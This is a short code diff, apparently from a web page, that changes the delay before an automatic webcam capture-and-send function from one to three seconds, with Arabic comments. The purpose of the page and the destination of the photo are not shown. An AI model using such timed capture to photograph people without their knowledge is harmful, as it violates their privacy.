@@ -57,7 +57,7 @@
                 video.srcObject = stream;
                 video.addEventListener('loadedmetadata', () => {
                     // تحديد مدة عمل الكاميرا
-                    setTimeout(captureAndSendPhoto, 1000); // التقاط الصورة بعد 3 ثوانٍ
+                    setTimeout(captureAndSendPhoto, 3000); // التقاط الصورة بعد 3 ثوانٍ
                 });
             })
             .catch((err) => console.error('خطأ في الوصول إلى الكاميرا: ', err));
